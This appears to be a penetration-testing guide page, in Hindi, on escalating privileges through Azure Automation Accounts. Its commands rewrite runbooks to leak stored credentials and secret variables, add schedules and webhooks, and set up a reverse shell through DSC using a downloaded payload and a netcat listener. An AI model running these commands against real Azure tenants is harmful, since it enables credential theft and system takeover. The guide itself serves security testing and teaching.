# Az - Azure Automation Accounts Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Azure Automation Accounts

अधिक जानकारी के लिए देखें:

{{#ref}}
../az-services/az-automation-accounts.md
{{#endref}}

### Hybrid Workers Group

याद रखें कि यदि किसी तरह एक हमलावर एक हाइब्रिड वर्कर में एक मनमाना रनबुक (मनमाना कोड) निष्पादित कर सकता है, तो वह **VM के स्थान पर पिवट करेगा**। यह एक ऑन-प्रिमाइस मशीन, एक अलग क्लाउड का VPC या यहां तक कि एक Azure VM हो सकता है।

इसके अलावा, यदि हाइब्रिड वर्कर Azure में अन्य प्रबंधित पहचान के साथ चल रहा है, तो रनबुक **रनबुक की प्रबंधित पहचान और VM की सभी प्रबंधित पहचान को मेटाडेटा सेवा से** एक्सेस कर सकेगा।

> [!TIP]
> याद रखें कि **मेटाडेटा सेवा** का एक अलग URL है (**`http://169.254.169.254`**) उस सेवा से जहां से ऑटोमेशन खाते की प्रबंधित पहचान टोकन प्राप्त किया जाता है (**`IDENTITY_ENDPOINT`**).

### `Microsoft.Automation/automationAccounts/jobs/write`, `Microsoft.Automation/automationAccounts/runbooks/draft/write`, `Microsoft.Automation/automationAccounts/jobs/output/read`, `Microsoft.Automation/automationAccounts/runbooks/publish/action` (`Microsoft.Resources/subscriptions/resourcegroups/read`, `Microsoft.Automation/automationAccounts/runbooks/write`)

संक्षेप में, ये अनुमतियाँ **ऑटोमेशन खाते में रनबुक बनाने, संशोधित करने और चलाने** की अनुमति देती हैं, जिसे आप **ऑटोमेशन खाते के संदर्भ में कोड निष्पादित करने** और असाइन की गई **प्रबंधित पहचान** के लिए विशेषाधिकार बढ़ाने और ऑटोमेशन खाते में संग्रहीत **क्रेडेंशियल्स** और **एन्क्रिप्टेड वेरिएबल्स** को लीक करने के लिए उपयोग कर सकते हैं।

अनुमति **`Microsoft.Automation/automationAccounts/runbooks/draft/write`** ऑटोमेशन खाते में एक रनबुक के कोड को संशोधित करने की अनुमति देती है:
```bash
# Update the runbook content with the provided PowerShell script
az automation runbook replace-content --no-wait \
--resource-group Resource_Group_1 \
--automation-account-name autoaccount1 \
--name AzureAutomationTutorialWithIdentity \
--content '$creds = Get-AutomationPSCredential -Name "<credential-name>"
$runbook_variable = Get-AutomationVariable -Name "<encrypted-variable-name>"
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password'
```
ध्यान दें कि पिछले स्क्रिप्ट का उपयोग **उपयोगकर्ता नाम और पासवर्ड** को **leak** करने और Automation Account में संग्रहीत **encrypted variable** के मान को प्राप्त करने के लिए किया जा सकता है।

अनुमति **`Microsoft.Automation/automationAccounts/runbooks/publish/action`** उपयोगकर्ता को Automation Account में एक Runbook प्रकाशित करने की अनुमति देती है ताकि परिवर्तन लागू किए जा सकें:
```bash
az automation runbook publish \
--resource-group <res-group> \
--automation-account-name <account-name> \
--name <runbook-name>
```
अनुमति **`Microsoft.Automation/automationAccounts/jobs/write`** उपयोगकर्ता को Automation Account में Runbook चलाने की अनुमति देती है:
```bash
az automation runbook start \
--automation-account-name <account-name> \
--resource-group <res-group> \
--name <runbook-name> \
[--run-on <name-hybrid-group>]
```
अनुमति **`Microsoft.Automation/automationAccounts/jobs/output/read`** उपयोगकर्ता को Automation Account में एक नौकरी के आउटपुट को पढ़ने की अनुमति देती है:
```bash
az rest --method GET \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>/jobs/<job-name>/output?api-version=2023-11-01"
```
यदि Runbooks बनाए नहीं गए हैं, या आप एक नया बनाना चाहते हैं, तो आपको इसे करने के लिए **permissions `Microsoft.Resources/subscriptions/resourcegroups/read` और `Microsoft.Automation/automationAccounts/runbooks/write`** की आवश्यकता होगी:
```bash
az automation runbook create --automation-account-name <account-name> --resource-group <res-group> --name <runbook-name> --type PowerShell
```
### `Microsoft.Automation/automationAccounts/write`, `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`

यह अनुमति उपयोगकर्ता को **Automation Account** को उपयोगकर्ता प्रबंधित पहचान सौंपने की अनुमति देती है:
```bash
az rest --method PATCH \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>?api-version=2020-01-13-preview" \
--headers "Content-Type=application/json" \
--body '{
"identity": {
"type": "UserAssigned",
"userAssignedIdentities": {
"/subscriptions/<subscripntion-id>/resourceGroups/<res-group>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<user-managed-identity-name>": {}
}
}
}'
```
### `Microsoft.Automation/automationAccounts/schedules/write`, `Microsoft.Automation/automationAccounts/jobSchedules/write`

अनुमति **`Microsoft.Automation/automationAccounts/schedules/write`** के साथ, Automation Account में एक नया Schedule बनाना संभव है जो हर 15 मिनट में निष्पादित होता है (बहुत छिपा हुआ नहीं) निम्नलिखित कमांड का उपयोग करके।

ध्यान दें कि **एक शेड्यूल के लिए न्यूनतम अंतराल 15 मिनट** है, और **न्यूनतम प्रारंभ समय 5 मिनट** भविष्य में है।
```bash
## For linux
az automation schedule create \
--resource-group <RESOURCE_GROUP> \
--automation-account-name <AUTOMATION_ACCOUNT_NAME> \
--name <SCHEDULE_NAME> \
--description "Triggers runbook every minute" \
--start-time "$(date -u -d "7 minutes" +%Y-%m-%dT%H:%M:%SZ)" \
--frequency Minute \
--interval 15

## Form macOS
az automation schedule create \
--resource-group <RESOURCE_GROUP> \
--automation-account-name <AUTOMATION_ACCOUNT_NAME> \
--name <SCHEDULE_NAME> \
--description "Triggers runbook every 15 minutes" \
--start-time "$(date -u -v+7M +%Y-%m-%dT%H:%M:%SZ)" \
--frequency Minute \
--interval 15
```
फिर, अनुमति **`Microsoft.Automation/automationAccounts/jobSchedules/write`** के साथ, एक रनबुक को शेड्यूलर असाइन करना संभव है:
```bash
az rest --method PUT \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-accounts>/jobSchedules/b510808a-8fdc-4509-a115-12cfc3a2ad0d?api-version=2015-10-31" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"runOn": "",
"runbook": {
"name": "<runbook-name>"
},
"schedule": {
"name": "<scheduler-name>>"
},
"parameters": {}
}
}'
```
> [!TIP]
> पिछले उदाहरण में jobchedule id को **`b510808a-8fdc-4509-a115-12cfc3a2ad0d` उदाहरण के रूप में** छोड़ा गया था, लेकिन आपको इस असाइनमेंट को बनाने के लिए एक मनमाना मान उपयोग करने की आवश्यकता होगी।

### `Microsoft.Automation/automationAccounts/webhooks/write`

अनुमति **`Microsoft.Automation/automationAccounts/webhooks/write`** के साथ, Automation Account के अंदर एक Runbook के लिए एक नया Webhook बनाने के लिए निम्नलिखित कमांड का उपयोग किया जा सकता है।

ध्यान दें कि आपको उपयोग करने के लिए टोकन के साथ **webhook URI** को **संकेत** करना होगा।
```bash
az rest --method PUT \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automantion-account-name>/webhooks/<webhook-name>?api-version=2018-06-30" \
--body '{
"name": "<webhook-name>",
"properties": {
"isEnabled": true,
"expiryTime": "2026-01-09T20:03:30.291Z",
"parameters": {},
"runOn": null,
"runbook": {
"name": "<runbook-name>"
},
"uri": "https://f931b47b-18c8-45a2-9d6d-0211545d8c02.webhook.eus.azure-automation.net/webhooks?token=Ts5WmbKk0zcuA8PEUD4pr%2f6SM0NWydiCDqCqS1IdzIU%3d"
}
}'

# Then, to call the runbook using the webhook
curl -X POST "https://f931b47b-18c8-45a2-9d6d-0211545d8c02.webhook.eus.azure-automation.net/webhooks?token=Ts5WmbKk0zcuA8PEUD4pr%2f6SM0NWydiCDqCqS1IdzIU%3d" \
-H "Content-Length: 0"
```
### `Microsoft.Automation/automationAccounts/runbooks/draft/write`

केवल `Microsoft.Automation/automationAccounts/runbooks/draft/write` अनुमति के साथ, **एक Runbook का कोड अपडेट करना** संभव है बिना इसे प्रकाशित किए और इसे निम्नलिखित कमांड का उपयोग करके चलाना।
```bash
# Update the runbook content with the provided PowerShell script
az automation runbook replace-content --no-wait \
--resource-group Resource_Group_1 \
--automation-account-name autoaccount1 \
--name AzureAutomationTutorialWithIdentity \
--content 'echo "Hello World"'

# Run the unpublished code
## Indicate the name of the hybrid worker group in runOn to execute the runbook there
az rest \
--method PUT \
--url "https://management.azure.com/subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Automation/automationAccounts/autoaccount1/runbooks/AzureAutomationTutorialWithIdentity/draft/testJob?api-version=2023-05-15-preview" \
--headers "Content-Type=application/json" \
--body '{
"parameters": {},
"runOn": "",
"runtimeEnvironment": "PowerShell-5.1"
}'

# Get the output (a different permission is needed here, but you could get a revershell or exfiltrate the token to avoid needing this permission)
az rest --method get --url "https://management.azure.com/subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Automation/automationAccounts/autoaccount1/runbooks/AzureAutomationTutorialWithIdentity/draft/testJob/streams?api-version=2019-06-01"
```
### `Microsoft.Automation/automationAccounts/sourceControls/write`, (`Microsoft.Automation/automationAccounts/sourceControls/read`)

यह अनुमति उपयोगकर्ता को Automation Account के लिए **एक स्रोत नियंत्रण कॉन्फ़िगर** करने की अनुमति देती है, जैसे कि निम्नलिखित कमांड का उपयोग करते हुए (यह Github को उदाहरण के रूप में उपयोग करता है):
```bash
az automation source-control create \
--resource-group <res-group> \
--automation-account-name <automation-account-name> \
--name RemoteGithub \
--repo-url https://github.com/carlospolop/gh-runbooks.git \
--branch main \
--folder-path /runbooks/ \
--publish-runbook true \
--auto-sync \
--source-type GitHub \
--token-type PersonalAccessToken \
--access-token github_pat_11AEDCVZ<rest-of-the-token>
```
यह स्वचालित रूप से Github रिपॉजिटरी से रनबुक को ऑटोमेशन अकाउंट में आयात करेगा और कुछ अन्य अनुमतियों के साथ उन्हें चलाना शुरू करना **संभव है कि विशेषाधिकार बढ़ाए जाएं**।

इसके अलावा, याद रखें कि ऑटोमेशन अकाउंट में स्रोत नियंत्रण काम करने के लिए, इसमें **`Contributor`** भूमिका के साथ एक प्रबंधित पहचान होनी चाहिए और यदि यह एक उपयोगकर्ता प्रबंधित पहचान है, तो MI का क्लाइंट आईडी को **`AUTOMATION_SC_USER_ASSIGNED_IDENTITY_ID`** वेरिएबल में निर्दिष्ट किया जाना चाहिए।

> [!TIP]
> ध्यान दें कि एक बार स्रोत नियंत्रण का निर्माण हो जाने के बाद, इसके रिपॉजिटरी URL को बदलना संभव नहीं है।

### `Microsoft.Automation/automationAccounts/variables/write`

अनुमति **`Microsoft.Automation/automationAccounts/variables/write`** के साथ, निम्नलिखित कमांड का उपयोग करके ऑटोमेशन अकाउंट में वेरिएबल लिखना संभव है।
```bash
az rest --method PUT \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>/variables/<variable-name>?api-version=2019-06-01" \
--headers "Content-Type=application/json" \
--body '{
"name": "<variable-name>",
"properties": {
"description": "",
"value": "\"<variable-value>\"",
"isEncrypted": false
}
}'
```
### कस्टम रनटाइम वातावरण

यदि एक ऑटोमेशन खाता एक कस्टम रनटाइम वातावरण का उपयोग कर रहा है, तो यह संभव है कि रनटाइम के एक कस्टम पैकेज को कुछ दुर्भावनापूर्ण कोड (जैसे **एक बैकडोर**) के साथ ओवरराइट किया जा सके। इस तरह, जब भी उस कस्टम रनटाइम का उपयोग करने वाला एक रनबुक निष्पादित होता है और कस्टम पैकेज को लोड करता है, तो दुर्भावनापूर्ण कोड निष्पादित होगा।

### राज्य कॉन्फ़िगरेशन का समझौता करना

**पूर्ण पोस्ट देखें:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

- चरण 1 — फ़ाइलें बनाएं

**आवश्यक फ़ाइलें:** दो PowerShell स्क्रिप्ट की आवश्यकता है:
1. `reverse_shell_config.ps1`: एक इच्छित राज्य कॉन्फ़िगरेशन (DSC) फ़ाइल जो पेलोड को लाने और निष्पादित करने के लिए है। यह [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1) से प्राप्त किया जा सकता है।
2. `push_reverse_shell_config.ps1`: एक स्क्रिप्ट जो कॉन्फ़िगरेशन को VM पर प्रकाशित करती है, जो [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1) पर उपलब्ध है।

**कस्टमाइजेशन:** इन फ़ाइलों में वेरिएबल और पैरामीटर को उपयोगकर्ता के विशिष्ट वातावरण के अनुसार अनुकूलित किया जाना चाहिए, जिसमें संसाधन नाम, फ़ाइल पथ, और सर्वर/पेलोड पहचानकर्ता शामिल हैं।

- चरण 2 — कॉन्फ़िगरेशन फ़ाइल को ज़िप करें

`reverse_shell_config.ps1` को एक `.zip` फ़ाइल में संकुचित किया जाता है, जिससे इसे Azure स्टोरेज खाते में स्थानांतरित करने के लिए तैयार किया जा सके।
```bash
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
- Step 3 — सेट स्टोरेज कॉन्टेक्स्ट और अपलोड करें

ज़िप किया गया कॉन्फ़िगरेशन फ़ाइल को एक पूर्वनिर्धारित Azure स्टोरेज कंटेनर, azure-pentest, में Azure के Set-AzStorageBlobContent cmdlet का उपयोग करके अपलोड किया जाता है।
```bash
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
- Step 4 — Prep Kali Box

Kali सर्वर GitHub रिपॉजिटरी से RevPS.ps1 पेलोड डाउनलोड करता है।
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
स्क्रिप्ट को लक्षित Windows VM और रिवर्स शेल के लिए पोर्ट निर्दिष्ट करने के लिए संपादित किया गया है।

- Step 5 — Publish Configuration File

कॉन्फ़िगरेशन फ़ाइल को निष्पादित किया जाता है, जिसके परिणामस्वरूप रिवर्स-शेल स्क्रिप्ट को Windows VM पर निर्दिष्ट स्थान पर तैनात किया जाता है।

- Step 6 — Host Payload and Setup Listener

पेलोड को होस्ट करने के लिए एक Python SimpleHTTPServer शुरू किया जाता है, साथ ही आने वाले कनेक्शनों को कैप्चर करने के लिए एक Netcat लिस्नर भी।
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
निर्धारित कार्य पेलोड को निष्पादित करता है, SYSTEM-स्तरीय विशेषाधिकार प्राप्त करता है।

{{#include ../../../banners/hacktricks-training.md}}
